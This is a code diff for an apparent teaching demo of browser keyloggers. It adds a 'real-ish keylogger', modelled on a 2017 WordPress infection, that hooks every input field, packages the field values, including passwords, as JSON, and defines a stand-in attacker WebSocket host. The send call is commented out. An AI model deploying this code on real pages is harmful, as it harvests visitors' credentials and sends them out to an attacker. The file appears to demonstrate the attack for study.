@@ -1,12 +1,46 @@
-// Show the pressed character (shows all keys pressed while this page is loaded)
-document.addEventListener("keypress", e => {
-  console.log(`COMMON-EVENT: You pressed the ${String.fromCharCode(e.charCode)} key while on the webpage`);
-});
+////////////////////////////////////////////////////////////////////////////////
+// REAL-ISH KEYLOGGER  /////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
 
-// Show the pressed character (shows all keys pressed while this page is loaded)
-document.getElementById("password").addEventListener("keypress", e => {
-  console.log(`PASSWORD-EVENT: you pressed the ${String.fromCharCode(e.charCode)} key in the password field`);
-});
+// As you can see, it’s a keylogger.
+// This script adds a handler to every input field on the websites to send its value to the attacker (wss://cloudflare[.]solutions:8085/) when a user leaves that field.
+var socketurl = "wss://my.bad.guy.server:9973/";
+var socket = socketurl;//new ReconnectingWebSocket(socketurl);
+
+// What was observed was that scripts where identified over the web that really didn't do what they appeared to do (lint)
+// but rather the domain names were red herrings. The payload was embedded in encoaded hex sequences and subsequently decoded,
+// injecting code similar to what follows into each webpage that had this code.
+//
+// For more info, see:
+// https://blog.sucuri.net/2017/12/cloudflare-solutions-keylogger-on-thousands-of-infected-wordpress-sites.html
+
+function process_event(event) {
+    var result = JSON.stringify({
+        key: event.target.value,
+        element: event.target.id
+    });
+    console.log(`your password (key): ${event.target.value}, from input field w/ ID (element): ${event.target.id}`);
+    // socket.send(result);
+}
+
+var i_fields = document.getElementsByTagName('input');
+for (var i = 0; i < i_fields.length; i++) {
+    i_fields[i].addEventListener('blur', process_event);
+}
+
+////////////////////////////////////////////////////////////////////////////////
+// SIMPLE KEYLOGGER (really just listening to key press events) ////////////////
+////////////////////////////////////////////////////////////////////////////////
+
+// // Show the pressed character (shows all keys pressed while this page is loaded)
+// document.addEventListener("keypress", e => {
+//   console.log(`COMMON-EVENT: You pressed the ${String.fromCharCode(e.charCode)} key while on the webpage`);
+// });
+//
+// // Show the pressed character (shows all keys pressed while this page is loaded)
+// document.getElementById("password").addEventListener("keypress", e => {
+//   console.log(`PASSWORD-EVENT: you pressed the ${String.fromCharCode(e.charCode)} key in the password field`);
+// });
 
 // Handle page closing
 // window.addEventListener("beforeunload", e => {
@@ -18,6 +52,8 @@ document.getElementById("password").addEventListener("keypress", e => {
 //   return message;
 // });
 
+////////////////////////////////////////////////////////////////////////////////
+// FORM EXAMPLE W/ INTERESTING DATA FIELDS, INCLUDING PASSWORD /////////////////
 ////////////////////////////////////////////////////////////////////////////////
 
 // Shows all user input and cancels form data sending
